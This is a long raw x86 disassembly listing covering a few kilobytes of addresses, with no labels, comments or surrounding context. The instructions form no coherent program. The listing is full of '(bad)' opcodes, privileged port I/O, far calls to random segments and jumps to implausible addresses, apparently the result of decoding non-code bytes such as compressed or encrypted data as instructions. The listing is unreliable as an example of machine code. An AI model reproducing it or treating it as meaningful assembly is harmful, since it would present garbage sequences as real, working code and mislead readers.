  4360cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4360ce:	retf   
  4360cf:	or     al,0x4a
  4360d1:	mov    cl,0x89
  4360d3:	mov    cl,0xab
  4360d5:	push   ecx
  4360d6:	shr    BYTE PTR [edx+0x74],1
  4360d9:	xchg   ebx,eax
  4360da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4360db:	mov    BYTE PTR es:[esi-0x6285334a],0xab
  4360e3:	pop    ebx
  4360e4:	in     eax,dx
  4360e5:	sbb    al,0xa7
  4360e7:	and    ebp,DWORD PTR [eax+0x70]
  4360ea:	add    DWORD PTR [edx+0x20],0x4
  4360ee:	out    0x24,al
  4360f0:	das    
  4360f1:	and    eax,0x21e51724
  4360f6:	scas   eax,DWORD PTR es:[edi]
  4360f7:	inc    edx
  4360f8:	and    eax,0x9f595281
  4360fd:	cmc    
  4360fe:	push   0x5d291fbc
  436103:	(bad)  
  436104:	mov    edx,0x3fc5e9b9
  436109:	mov    ah,0xbb
  43610b:	dec    ebp
  43610c:	sub    eax,0xa3e28be3
  436111:	repz call 0x8b1f85ee
  436117:	lods   eax,DWORD PTR ds:[esi]
  436118:	stos   BYTE PTR es:[edi],al
  436119:	clc    
  43611a:	cdq    
  43611b:	xchg   ebp,eax
  43611c:	aas    
  43611d:	jnp    0x436172
  43611f:	repnz pop ds
  436121:	call   0xea998110
  436126:	or     eax,0xe8532e24
  43612b:	jmp    0x43618b
  43612d:	xchg   edx,eax
  43612e:	mov    ecx,0xb839e8fc
  436133:	mov    ah,0xb3
  436135:	push   cs
  436136:	pop    esi
  436137:	push   es
  436138:	aad    0xfa
  43613a:	cmc    
  43613b:	out    0x3c,eax
  43613d:	icebp  
  43613e:	add    dl,BYTE PTR [edi]
  436140:	and    bl,cl
  436142:	sub    eax,0x65f6ddf
  436147:	and    BYTE PTR [ecx-0x64],cl
  43614a:	fistp  DWORD PTR [edx+0x76]
  43614d:	or     eax,0x4317e29e
  436152:	cmc    
  436153:	sar    BYTE PTR [edx+0x70ebb9b7],1
  436159:	retf   
  43615a:	xchg   ebp,eax
  43615b:	in     eax,0x19
  43615d:	int    0xae
  43615f:	retf   0xf54d
  436162:	xchg   DWORD PTR [eax-0x365d433a],ebx
  436168:	push   ecx
  436169:	push   ecx
  43616a:	popf   
  43616b:	push   cs
  43616c:	sbb    eax,0x1e16f498
  436171:	mov    ecx,0x9d50393e
  436176:	cdq    
  436177:	jecxz  0x43611c
  436179:	test   DWORD PTR [edx+0x33],0xe56d2ab5
  436180:	dec    esp
  436181:	jne    0x43614a
  436183:	jle    0x4361f7
  436185:	push   eax
  436186:	push   ds
  436187:	stc    
  436188:	sbb    eax,0xfa839e59
  43618d:	pop    ecx
  43618e:	push   0x3
  436190:	mov    cl,dl
  436192:	jmp    0x4361eb
  436194:	mov    fs,eax
  436196:	jne    0x436133
  436198:	mov    ds:0xe4c5d302,eax
  43619d:	cli    
  43619e:	cmp    BYTE PTR [ecx+0x24],al
  4361a1:	sbb    DWORD PTR [edx-0x7d66c7f8],edi
  4361a7:	in     eax,0x36
  4361a9:	call   DWORD PTR [ebp+0x30da9918]
  4361af:	dec    edi
  4361b0:	pop    esp
  4361b1:	aas    
  4361b2:	mov    cl,0x91
  4361b4:	dec    esi
  4361b5:	push   0x4a4664b9
  4361ba:	or     eax,0x3077e59b
  4361bf:	in     eax,0x53
  4361c1:	pop    ebx
  4361c2:	nop
  4361c3:	and    eax,0x97e67a12
  4361c8:	in     al,0xb0
  4361ca:	aad    0xe2
  4361cc:	cmp    ecx,DWORD PTR [esi+0x35]
  4361cf:	xor    DWORD PTR [eax],eax
  4361d1:	jne    0x43618e
  4361d3:	sub    BYTE PTR [esi+0x23e2445a],ah
  4361d9:	adc    DWORD PTR [edx],edx
  4361db:	pop    ebx
  4361dc:	mov    ebx,0xa0ec7c71
  4361e1:	and    bh,BYTE PTR [esp+eax*8-0x6773a9dd]
  4361e8:	and    eax,0xfe82fa9
  4361ed:	mov    DWORD PTR [ebp-0x4d],eax
  4361f0:	push   edx
  4361f1:	cmp    DWORD PTR [ebp-0x36],edi
  4361f4:	mov    ds:0xc1fe3ed1,al
  4361f9:	loop   0x43624a
  4361fb:	out    dx,eax
  4361fc:	push   ebp
  4361fd:	jb     0x4361af
  4361ff:	jmp    0x817fa4dc
  436204:	and    BYTE PTR [ecx],bl
  436206:	sbb    DWORD PTR [eax],esp
  436208:	ja     0x43618b
  43620a:	sbb    al,0x8f
  43620c:	cmp    al,0x9a
  43620e:	fstp   TBYTE PTR [esi+0x2db80824]
  436214:	jmp    0x43626b
  436216:	stos   BYTE PTR es:[edi],al
  436217:	or     BYTE PTR [ebp+0x1bb4b6cc],bh
  43621d:	in     al,0x77
  43621f:	lods   eax,DWORD PTR ds:[esi]
  436220:	je     0x4361c1
  436222:	fcmovne st,st(2)
  436224:	mov    WORD PTR [ebx],es
  436226:	js     0x4362a4
  436228:	sub    esi,eax
  43622a:	cmp    edi,DWORD PTR [ecx+ecx*2-0x58ab390a]
  436231:	pop    eax
  436232:	xchg   ecx,eax
  436233:	mov    al,0xad
  436235:	mov    ds:0xc0a6b0fb,al
  43623a:	cmp    BYTE PTR [esi+0x35afcef3],0x38
  436241:	in     eax,0xbe
  436243:	add    al,0x91
  436245:	xlat   BYTE PTR ds:[ebx]
  436246:	icebp  
  436247:	lds    esi,FWORD PTR [esi]
  436249:	es xchg ecx,eax
  43624b:	xlat   BYTE PTR ds:[ebx]
  43624c:	and    eax,0x9ab4247f
  436251:	sbb    ch,BYTE PTR [edx-0x78]
  436254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436255:	push   ebx
  436256:	mov    ch,0x64
  436258:	jmp    0xb5e95a99
  43625d:	loopne 0x4361f1
  43625f:	out    dx,eax
  436260:	push   eax
  436261:	sbb    DWORD PTR [ebx+0x1d],0xb3eedad7
  436268:	sbb    cl,bh
  43626a:	sub    bl,BYTE PTR [eax]
  43626c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43626d:	in     al,0xaa
  43626f:	inc    edi
  436270:	lds    esp,FWORD PTR [esi]
  436272:	fwait
  436273:	call   0x8e703899
  436278:	aaa    
  436279:	stc    
  43627a:	xchg   edi,edx
  43627c:	(bad)  
  43627e:	dec    eax
  43627f:	in     al,dx
  436280:	xchg   ecx,eax
  436281:	cmp    al,0xb3
  436283:	call   0xcd7317ee
  436288:	out    dx,eax
  436289:	mov    fs,esp
  43628b:	mov    edx,0x4200b52a
  436290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436291:	fild   QWORD PTR [edx-0x3916e93d]
  436297:	and    al,0x4b
  436299:	inc    edi
  43629a:	pushf  
  43629b:	mov    dl,0x7c
  43629d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43629e:	mov    esi,DWORD PTR [eax]
  4362a0:	call   0xa89e:0x91c0b1c2
  4362a7:	push   ss
  4362a8:	js     0x436290
  4362aa:	mov    al,0x44
  4362ac:	je     0x4362c5
  4362ae:	int    0xbd
  4362b0:	push   ebp
  4362b1:	or     BYTE PTR [esi-0xc],0x5a
  4362b5:	pop    edi
  4362b6:	imul   esi,esi,0x5f5c3d06
  4362bc:	or     eax,0xe9ec8610
  4362c1:	push   ebp
  4362c2:	add    ebx,DWORD PTR [eax+0x17]
  4362c5:	lahf   
  4362c6:	(bad)  
  4362c7:	pmullw mm3,QWORD PTR [esi+0x3]
  4362cb:	icebp  
  4362cc:	aas    
  4362cd:	cmp    eax,0xa380b719
  4362d2:	outs   dx,BYTE PTR ds:[esi]
  4362d3:	and    eax,0xed83210d
  4362d8:	shl    DWORD PTR [ecx+0x33420a4b],cl
  4362de:	in     al,dx
  4362df:	das    
  4362e0:	inc    ebx
  4362e1:	in     eax,0xa4
  4362e3:	xor    DWORD PTR [eax+0x77f4ba36],edi
  4362e9:	paddb  mm5,QWORD PTR [ecx+0x5]
  4362ed:	add    al,0x9
  4362ef:	cmc    
  4362f0:	test   eax,0xb294882a
  4362f5:	dec    ebx
  4362f6:	leave  
  4362f7:	jmp    0x49bf044e
  4362fc:	add    edx,DWORD PTR [ecx]
  4362fe:	mov    dh,0xa5
  436300:	mov    WORD PTR [esi-0x3cce084],ss
  436306:	cmp    DWORD PTR ds:[ecx],eax
  436309:	xor    BYTE PTR [eax-0x10],dh
  43630c:	jg     0x436298
  43630e:	pop    ecx
  43630f:	fimul  WORD PTR [esi+0x3b]
  436312:	mov    ebx,0xe9507cb4
  436317:	ret    
  436318:	and    eax,0x42ef360d
  43631d:	mov    ds:0x198fa516,al
  436322:	retf   0xa6ae
  436325:	mov    al,ds:0x8961ea57
  43632a:	mov    cl,0x15
  43632c:	cmc    
  43632d:	lods   al,BYTE PTR ds:[esi]
  43632e:	arpl   sp,si
  436330:	int    0x42
  436332:	adc    eax,0x7f492423
  436337:	in     al,dx
  436338:	scas   al,BYTE PTR es:[edi]
  436339:	scas   eax,DWORD PTR es:[edi]
  43633a:	gs ret 
  43633c:	sbb    DWORD PTR [ecx+eax*1],0xc1d923a1
  436343:	stc    
  436344:	or     eax,0x5244258c
  436349:	mov    DWORD PTR [edx+esi*1],ebp
  43634c:	sub    BYTE PTR [ebx-0xedba6e0],al
  436352:	dec    edi
  436353:	mov    ah,0xc8
  436355:	cdq    
  436356:	(bad)  [ecx-0x40]
  436359:	pmuludq mm0,mm5
  43635c:	pusha  
  43635d:	in     al,dx
  43635e:	call   0xae07:0x1fcc7aa5
  436365:	and    BYTE PTR [esi+0x6ba060a4],dh
  43636b:	sub    BYTE PTR [edi+ebp*1],ah
  43636e:	sbb    eax,DWORD PTR [edi]
  436370:	dec    edx
  436371:	(bad)  
  436372:	jns    0x436369
  436374:	dec    eax
  436375:	push   ecx
  436376:	mov    al,0xd4
  436378:	and    DWORD PTR [edx+0x31750689],ecx
  43637e:	hlt    
  43637f:	out    dx,eax
  436380:	(bad)  
  436382:	dec    ecx
  436383:	xchg   ebp,eax
  436384:	repz dec esp
  436386:	sbb    al,0x44
  436388:	(bad)  
  436389:	int    0x55
  43638b:	icebp  
  43638c:	cmp    BYTE PTR [ebx+0x25252c63],cl
  436392:	mov    edx,0xcef9fdec
  436397:	mov    cl,0x16
  436399:	jmp    0xec704cf6
  43639e:	aam    0xfe
  4363a0:	xchg   ebp,eax
  4363a1:	mov    eax,ds:0x1cb9925b
  4363a6:	aad    0x7b
  4363a8:	cld    
  4363a9:	cmp    al,BYTE PTR [esi+esi*2]
  4363ac:	push   esi
  4363ad:	sti    
  4363ae:	mov    bl,0xa4
  4363b0:	or     BYTE PTR [ebx],0xfa
  4363b3:	les    edi,FWORD PTR [ebp+0x11d33bb2]
  4363b9:	pop    ebp
  4363ba:	pop    ebx
  4363bb:	(bad)  
  4363bc:	iret   
  4363bd:	shl    BYTE PTR [edi],1
  4363bf:	and    al,BYTE PTR [edi]
  4363c1:	mov    ds:0xbe2f6eb2,al
  4363c6:	mov    edx,0xf3d9f494
  4363cb:	rcl    DWORD PTR [ebp+0x48ef7578],0x29
  4363d2:	push   es
  4363d3:	js     0x43641e
  4363d5:	call   0x3ed9:0xb98c6e75
  4363dc:	and    edi,edi
  4363de:	stos   DWORD PTR es:[edi],eax
  4363df:	xor    al,0x38
  4363e1:	or     ebp,DWORD PTR [eax+edi*1-0x16]
  4363e5:	add    eax,esi
  4363e7:	out    0xd7,eax
  4363e9:	sbb    al,0x32
  4363eb:	icebp  
  4363ec:	adc    eax,0xd6638da
  4363f1:	popf   
  4363f2:	daa    
  4363f3:	rol    BYTE PTR [edx+0x59],0x21
  4363f7:	aam    0x46
  4363f9:	push   edx
  4363fa:	mov    ecx,0x5f9d20c7
  4363ff:	push   edi
  436400:	sti    
  436401:	test   eax,0x9705c92f
  436406:	mov    dl,0x10
  436408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436409:	mov    ds:0x83ff4e0b,al
  43640e:	sub    dl,BYTE PTR [edx]
  436410:	cmp    al,0x56
  436412:	pop    edx
  436413:	cmp    al,0x2c
  436415:	out    0xb9,eax
  436417:	inc    esp
  436418:	xchg   ebp,eax
  436419:	aas    
  43641a:	mul    BYTE PTR [ebp-0x58d0f7d8]
  436420:	mov    bh,0x34
  436422:	sbb    al,0xe8
  436424:	outs   dx,DWORD PTR ds:[esi]
  436425:	jne    0x4363c5
  436427:	aad    0x38
  436429:	fwait
  43642a:	mov    al,0x9c
  43642c:	sbb    bl,BYTE PTR [ecx]
  43642e:	adc    eax,0x49813799
  436433:	ins    DWORD PTR es:[edi],dx
  436434:	and    al,0xa6
  436436:	fwait
  436437:	jbe    0x43646d
  436439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43643a:	scas   eax,DWORD PTR es:[edi]
  43643b:	mov    ebp,ebp
  43643d:	xchg   BYTE PTR [eax+0x46],ah
  436440:	mov    al,0xae
  436442:	mov    ecx,0xab0d9ba4
  436447:	inc    ebp
  436448:	out    0xed,al
  43644a:	inc    ecx
  43644b:	(bad)  [edx]
  43644d:	test   BYTE PTR [edi+0x26],bh
  436450:	jbe    0x43649b
  436452:	mov    edx,0x68592a94
  436457:	out    0x4d,eax
  436459:	sub    ch,BYTE PTR [ecx-0x31e7dc21]
  43645f:	ins    DWORD PTR es:[edi],dx
  436460:	mov    ch,0x1a
  436462:	shl    ch,0xf2
  436465:	enter  0xd1a6,0x19
  436469:	sub    eax,edi
  43646b:	jne    0x436441
  43646d:	inc    esp
  43646e:	or     DWORD PTR [ebx],edi
  436470:	outs   dx,DWORD PTR ds:[esi]
  436471:	mov    ds:0x12f5875b,eax
  436476:	(bad)  
  436477:	pop    ecx
  436478:	ins    DWORD PTR es:[edi],dx
  436479:	fimul  DWORD PTR [esi+0x1d]
  43647c:	xor    DWORD PTR [ebp+0x4e8324bd],eax
  436482:	and    BYTE PTR [esi-0x6b],dl
  436485:	inc    ecx
  436486:	cdq    
  436487:	repnz push edi
  436489:	mov    bl,0x76
  43648b:	jp     0x4364b2
  43648d:	test   eax,0xd5668de5
  436492:	pop    ecx
  436493:	inc    eax
  436494:	adc    bh,BYTE PTR [eax+0x51b9200b]
  43649a:	stc    
  43649b:	fild   WORD PTR [esi]
  43649d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43649e:	js     0x43642c
  4364a0:	and    al,0x99
  4364a2:	popa   
  4364a3:	daa    
  4364a4:	dec    edi
  4364a5:	mov    BYTE PTR [esi+ebx*1],0x5b
  4364a9:	push   ebx
  4364aa:	pop    ds
  4364ab:	or     edi,DWORD PTR [edx+eax*8]
  4364ae:	push   ss
  4364af:	cmc    
  4364b0:	push   esi
  4364b1:	cmp    DWORD PTR [edi+0x27],0x4996982
  4364b8:	xchg   ebp,eax
  4364b9:	(bad)  
  4364ba:	in     al,dx
  4364bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4364bc:	or     al,BYTE PTR [ebx]
  4364be:	mov    bh,0x74
  4364c0:	hlt    
  4364c1:	je     0x436495
  4364c3:	add    al,0x79
  4364c5:	adc    dh,BYTE PTR [edx]
  4364c7:	mov    esp,0xa4bdc155
  4364cc:	dec    eax
  4364cd:	cs hlt 
  4364cf:	mov    edi,edx
  4364d1:	xchg   DWORD PTR [ecx-0x4cd3508b],ebx
  4364d7:	repnz add ah,BYTE PTR [ebp-0x58775b95]
  4364de:	fld    QWORD PTR [edx+0x39ae15e0]
  4364e4:	scas   al,BYTE PTR es:[edi]
  4364e5:	out    dx,eax
  4364e6:	mov    esp,0x387397a4
  4364eb:	lods   al,BYTE PTR ds:[esi]
  4364ec:	jne    0x436557
  4364ee:	mov    ch,0xeb
  4364f0:	sbb    DWORD PTR [ebx+ebx*1+0x4f],ebp
  4364f4:	push   ds
  4364f5:	mov    ecx,0xb4ffffc5
  4364fa:	sbb    al,0xdc
  4364fc:	inc    ebp
  4364fd:	sub    al,0x2c
  4364ff:	or     eax,0x3bd71f38
  436504:	or     bl,bh
  436506:	mov    bh,0x1c
  436508:	and    DWORD PTR [ecx+0x25],ebp
  43650b:	mov    DWORD PTR [eax],ebx
  43650d:	push   esp
  43650e:	(bad)  [edi-0x2de1fd43]
  436514:	inc    esp
  436515:	mov    WORD PTR [edi-0x4b],ds
  436518:	stos   DWORD PTR es:[edi],eax
  436519:	and    DWORD PTR [ebx-0x45b6cac2],ecx
  43651f:	push   esp
  436520:	call   0x3773bb2b
  436525:	call   0xf0d209db
  43652a:	ret    0x3573
  43652d:	sub    al,0xd2
  43652f:	in     al,0x89
  436531:	(bad)  
  436532:	(bad)  [esi+0x3752f91c]
  436538:	daa    
  436539:	ret    0x876c
  43653c:	push   edx
  43653d:	sbb    ah,BYTE PTR [ebp-0x1f]
  436540:	mov    ch,0x97
  436542:	div    edx
  436544:	xchg   edi,eax
  436545:	idiv   BYTE PTR ds:0x7f9b0e98
  43654b:	fsub   QWORD PTR ds:0xc64bf5e9
  436551:	nop
  436552:	adc    bl,BYTE PTR [ecx-0xf27ba8b]
  436558:	xchg   esi,eax
  436559:	loop   0x436515
  43655b:	repnz imul edi,DWORD PTR [ecx],0xffffffe3
  43655f:	fstp   DWORD PTR [edx+0x6e]
  436562:	sbb    BYTE PTR [esi-0x534707ed],ch
  436568:	(bad)  
  436569:	mov    edi,0x33390e20
  43656e:	and    DWORD PTR [ebp+0x5],eax
  436571:	xor    BYTE PTR [esi-0x4a714076],dh
  436577:	mov    ah,0x88
  436579:	push   ecx
  43657a:	mov    dl,0x9d
  43657c:	mov    DWORD PTR [ebx],ebx
  43657e:	repnz popf 
  436580:	in     eax,0x83
  436582:	dec    edi
  436583:	in     al,dx
  436584:	cdq    
  436585:	test   BYTE PTR [edi+edx*8+0x24],cl
  436589:	or     DWORD PTR [ecx+0x2c01bc60],ecx
  43658f:	lods   al,BYTE PTR ds:[esi]
  436590:	sbb    DWORD PTR [edx+ecx*2+0x63],ebx
  436594:	out    0xd3,al
  436596:	rcr    BYTE PTR [edi],cl
  436598:	bound  edi,QWORD PTR [ebx-0x4033883e]
  43659e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43659f:	icebp  
  4365a0:	push   ds
  4365a1:	cmp    DWORD PTR [ecx+0x59],ebx
  4365a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4365a5:	out    dx,al
  4365a6:	jmp    0x3be4033e
  4365ab:	fist   WORD PTR [ebp+0x3a]
  4365ae:	std    
  4365af:	cdq    
  4365b0:	scas   eax,DWORD PTR es:[edi]
  4365b1:	and    DWORD PTR [eax],ebx
  4365b3:	add    esi,DWORD PTR [ebx]
  4365b5:	mov    ah,0x79
  4365b7:	(bad)  
  4365b8:	sub    al,0x59
  4365ba:	pop    ds
  4365bb:	mov    bh,0x40
  4365bd:	(bad)  
  4365be:	jle    0x43657e
  4365c0:	arpl   WORD PTR [ecx],si
  4365c2:	int    0x8c
  4365c4:	sahf   
  4365c5:	push   ecx
  4365c6:	retf   0x859
  4365c9:	sbb    dh,BYTE PTR [edi-0x4b634c72]
  4365cf:	xchg   esp,eax
  4365d0:	cmc    
  4365d1:	cmp    al,0x8f
  4365d3:	fnstsw WORD PTR [eax+0x19458c49]
  4365d9:	fldcw  WORD PTR [ecx+0x14b1ac6]
  4365df:	test   DWORD PTR [edi],ebx
  4365e1:	dec    ecx
  4365e2:	retf   
  4365e3:	dec    eax
  4365e4:	das    
  4365e5:	aam    0xf3
  4365e7:	pop    ebx
  4365e8:	arpl   WORD PTR [ecx+0x56c73dbb],sp
  4365ee:	push   edx
  4365ef:	sbb    al,0xf0
  4365f1:	stos   DWORD PTR es:[edi],eax
  4365f2:	pop    esi
  4365f3:	or     eax,0x54b97463
  4365f8:	push   esp
  4365f9:	lea    edi,[ebp+0x47d153f]
  4365ff:	out    0x54,eax
  436601:	push   ecx
  436602:	cmp    esi,DWORD PTR [edi+eiz*2]
  436605:	sbb    DWORD PTR [edx+0x1f1a4cb3],ebp
  43660b:	push   esi
  43660c:	mov    edx,0xa92cb54b
  436611:	lods   eax,DWORD PTR ds:[esi]
  436612:	jle    0x4365e3
  436614:	cmp    al,0x64
  436616:	xchg   edx,eax
  436617:	adc    eax,0xd4cda480
  43661c:	pop    ecx
  43661d:	pop    es
  43661e:	pop    edi
  43661f:	out    dx,al
  436620:	out    dx,al
  436621:	dec    esp
  436622:	in     al,dx
  436623:	fstp   TBYTE PTR [ebp+0x66e60174]
  436629:	mov    dl,0x9c
  43662b:	into   
  43662c:	lds    ebx,FWORD PTR [ebp+0x41]
  43662f:	call   0x4cfca012
  436634:	out    0xca,eax
  436636:	pop    esp
  436637:	std    
  436638:	sbb    ecx,ebp
  43663a:	push   eax
  43663b:	dec    ebx
  43663c:	js     0x4365c6
  43663e:	test   DWORD PTR [ebx-0xce0de75],ebp
  436644:	lods   al,BYTE PTR ds:[esi]
  436645:	arpl   WORD PTR [ebx+0x57],bp
  436648:	mov    bh,0x48
  43664a:	scas   eax,DWORD PTR es:[edi]
  43664b:	add    eax,0xe63e064f
  436650:	xor    esp,DWORD PTR [eax+0x3b3854fb]
  436656:	fdivp  st(0),st
  436658:	test   BYTE PTR [esi+0x48b6ac81],ah
  43665e:	mov    esp,0xb7cad744
  436663:	jne    0x43668c
  436665:	jae    0x43664d
  436667:	fdivr  DWORD PTR [ecx-0x60]
  43666a:	add    ebp,esi
  43666c:	cmp    DWORD PTR [ecx],ebx
  43666e:	mov    bh,0xe6
  436670:	and    DWORD PTR [ecx-0x14340fce],ecx
  436676:	jmp    0x9f12:0xebd38399
  43667d:	shr    DWORD PTR [ecx-0x97be2f7],0x36
  436684:	mov    al,ds:0x28a14858
  436689:	cmp    ch,BYTE PTR [esi+eax*4-0x1f4c4364]
  436690:	mov    bh,0x5e
  436692:	sub    eax,0xd79fe227
  436697:	adc    eax,0xbb03818d
  43669c:	and    bl,BYTE PTR [ecx-0x754d64a1]
  4366a2:	jmp    0x436681
  4366a4:	scas   eax,DWORD PTR es:[edi]
  4366a5:	popf   
  4366a6:	jnp    0x43666a
  4366a8:	fisub  WORD PTR [eax+0x5e4fa048]
  4366ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4366af:	xor    BYTE PTR [ebx-0x51f75c5c],bl
  4366b5:	adc    eax,ecx
  4366b7:	inc    edi
  4366b8:	inc    esp
  4366b9:	popf   
  4366ba:	retf   
  4366bb:	mov    ebx,0x54123fc
  4366c0:	ins    BYTE PTR es:[edi],dx
  4366c1:	cmp    esi,ebp
  4366c3:	sub    DWORD PTR [esi+edx*2-0x61beda81],esi
  4366ca:	sti    
  4366cb:	test   DWORD PTR [edi+0x7d],edx
  4366ce:	fadd   st(0),st
  4366d0:	lods   eax,DWORD PTR ds:[esi]
  4366d1:	add    BYTE PTR [esi+0x12],ah
  4366d4:	sbb    eax,0xfa749229
  4366d9:	and    al,0xf8
  4366db:	dec    esp
  4366dc:	mov    bh,0x7f
  4366de:	cld    
  4366df:	rcl    cl,1
  4366e1:	inc    esp
  4366e2:	jle    0x436746
  4366e4:	add    eax,0x6fec9abd
  4366e9:	mov    dl,BYTE PTR [ebp+0x7b9f2b15]
  4366ef:	dec    edx
  4366f0:	adc    al,0x2e
  4366f2:	(bad)  
  4366f3:	fwait
  4366f4:	xchg   ecx,eax
  4366f5:	test   bl,0xba
  4366f8:	cld    
  4366f9:	enter  0x18a0,0x6d
  4366fd:	or     eax,0xa0c4e531
  436702:	int    0x6d
  436704:	loopne 0x436739
  436706:	xlat   BYTE PTR ds:[ebx]
  436707:	mov    ah,0x95
  436709:	popf   
  43670a:	pop    edi
  43670b:	pop    ds
  43670c:	sub    BYTE PTR [esi-0x1d],bh
  43670f:	mov    bh,0x59
  436711:	cmp    DWORD PTR [eax-0x4a7a304e],ecx
  436717:	cld    
  436718:	mov    ah,0x8e
  43671a:	ja     0x4366f2
  43671c:	xlat   BYTE PTR ds:[ebx]
  43671d:	inc    ebx
  43671e:	ret    0x2184
  436721:	in     al,0xcd
  436723:	xor    edi,esp
  436725:	sbb    edi,DWORD PTR [ebx-0x5f]
  436728:	inc    ebp
  436729:	int    0xf8
  43672b:	jmp    0xf6b7d83b
  436730:	mov    dh,0xf8
  436732:	jge    0x4366b7
  436734:	pop    ebx
  436735:	xchg   edi,eax
  436736:	mov    esi,0x69d05a44
  43673b:	retf   0x5aa5
  43673e:	cdq    
  43673f:	jmp    0x43673d
  436741:	xor    al,0xa5
  436743:	xor    ebx,DWORD PTR [ecx]
  436745:	cmp    DWORD PTR [edx+0xb4b994b],ecx
  43674b:	push   0x38
  43674d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43674e:	imul   edi,DWORD PTR [edx],0xffffffa7
  436751:	xchg   esi,eax
  436752:	repz jg 0x436736
  436755:	mov    edx,0x604fe3ce
  43675a:	(bad)  
  43675b:	not    BYTE PTR [ecx]
  43675d:	(bad)  
  43675e:	mov    ebp,0xef32bdf4
  436763:	xor    cl,BYTE PTR cs:[ecx-0x3f]
  436767:	sti    
  436768:	sbb    eax,0xabb5442d
  43676d:	dec    ebp
  43676e:	xlat   BYTE PTR ds:[ebx]
  43676f:	repnz cmp ax,0xa5a9
  436774:	and    ecx,DWORD PTR [edx]
  436776:	ds icebp 
  436778:	clc    
  436779:	es mov bh,0x9c
  43677c:	(bad)
  43677f:	in     eax,0xef
  436781:	cmp    al,0x1c
  436783:	aad    0x22
  436785:	pop    ecx
  436786:	jne    0x4367be
  436788:	sbb    al,0x73
  43678a:	leave  
  43678b:	xchg   DWORD PTR [edi],edi
  43678d:	sahf   
  43678e:	fild   DWORD PTR [ebx-0x2a9c7bef]
  436794:	js     0x43673d
  436796:	ins    BYTE PTR es:[edi],dx
  436797:	in     eax,dx
  436798:	lea    edi,[eax+edi*4+0x4]
  43679c:	mov    BYTE PTR [edx],al
  43679e:	(bad)  
  43679f:	outs   dx,BYTE PTR ds:[esi]
  4367a0:	cmc    
  4367a1:	data16 sub al,0x69
  4367a4:	daa    
  4367a5:	clc    
  4367a6:	push   edi
  4367a7:	xchg   DWORD PTR [ecx],esp
  4367a9:	jmp    0x6ce9ca4c
  4367ae:	rcr    edi,1
  4367b0:	fldenv [ebp+0x25ceda2b]
  4367b6:	push   eax
  4367b7:	and    dl,BYTE PTR [edi-0x6513c817]
  4367bd:	adc    dh,0x23
  4367c0:	mov    esp,0x79e4c390
  4367c5:	xchg   cl,cl
  4367c7:	mov    eax,0xa2fb9961
  4367cc:	repz pop edi
  4367ce:	pop    edx
  4367cf:	repz xchg esi,eax
  4367d1:	and    eax,0xffffffec
  4367d4:	out    dx,eax
  4367d5:	out    0x79,eax
  4367d7:	xchg   bl,bl
  4367d9:	inc    esp
  4367da:	sub    DWORD PTR ds:0x43b332aa,esi
  4367e0:	and    eax,0x59f13422
  4367e5:	and    eax,0x1994cf6d
  4367ea:	pop    bp
  4367ec:	cmp    BYTE PTR [edx],bl
  4367ee:	jns    0x436778
  4367f0:	loope  0x4367cd
  4367f2:	mov    cl,0xb3
  4367f4:	inc    ebp
  4367f5:	mov    ecx,es
  4367f7:	out    0x2a,eax
  4367f9:	imul   ebp
  4367fb:	mov    dl,0x43
  4367fd:	lock sahf 
  4367ff:	xchg   DWORD PTR [edx],eax
  436801:	xchg   dl,ch
  436803:	jnp    0x4367ba
  436805:	scas   al,BYTE PTR es:[edi]
  436806:	arpl   bp,bp
  436808:	dec    eax
  436809:	jg     0x4367d9
  43680b:	pop    ebp
  43680c:	ret    0xfb9a
  43680f:	imul   BYTE PTR [eax+0x5f]
  436812:	sbb    ch,BYTE PTR [ecx+eiz*1+0x2369e239]
  436819:	inc    esi
  43681a:	fs xor ebx,esp
  43681d:	mov    ds:0x6069593b,al
  436822:	or     eax,0x709798c3
  436827:	push   ecx
  436828:	or     al,0xe4
  43682a:	mov    ebx,0x2a874624
  43682f:	shl    DWORD PTR [edi-0x2e],0x16
  436833:	in     al,0xda
  436835:	inc    DWORD PTR ds:0xa651171e
  43683b:	and    DWORD PTR [ebx],0xffffffb9
  43683e:	pop    es
  43683f:	and    al,0x44
  436841:	push   eax
  436842:	sub    BYTE PTR [esi],dl
  436844:	cmc    
  436845:	mov    al,ds:0xe8e0e31b
  43684a:	cmp    dl,BYTE PTR [esi+0x73]
  43684d:	mov    al,0xdf
  43684f:	xor    bh,dl
  436851:	repnz leave 
  436853:	fs sbb al,0xa6
  436856:	jecxz  0x43682c
  436858:	ret    0x3127
  43685b:	add    edx,DWORD PTR [eax+0x69]
  43685e:	shr    BYTE PTR ds:0x801fb12f,cl
  436864:	sbb    dl,BYTE PTR [edi-0x1d09d346]
  43686a:	mov    ecx,0x6c3f7d54
  43686f:	pop    esp
  436870:	in     eax,0x3b
  436872:	pop    edx
  436873:	jmp    0xb6bb9bf5
  436878:	js     0x436804
  43687a:	fstp   QWORD PTR [esi+0xa41f924]
  436880:	jecxz  0x43684e
  436882:	leave  
  436883:	out    0xb5,al
  436885:	sbb    eax,DWORD PTR [esi]
  436887:	in     eax,dx
  436888:	adc    eax,0x4a995b11
  43688d:	sub    DWORD PTR [edx-0x30],ebx
  436890:	pop    edi
  436891:	pop    eax
  436892:	sub    cl,BYTE PTR [edx+0x1e]
  436895:	retf   0x6cbf
  436898:	gs pop ecx
  43689a:	cwde   
  43689b:	icebp  
  43689c:	xchg   DWORD PTR [ebp+edi*8-0x11b676e8],ebx
  4368a3:	cmp    BYTE PTR [esi+0x4e],0xb
  4368a7:	add    ebp,DWORD PTR [ecx+ebx*2+0xd5dabc]
  4368ae:	mov    ah,bh
  4368b0:	mov    bh,0x17
  4368b2:	fsub   st(7),st
  4368b4:	sbb    DWORD PTR [ecx+0x5797594a],ebx
  4368ba:	or     eax,0x9d735560
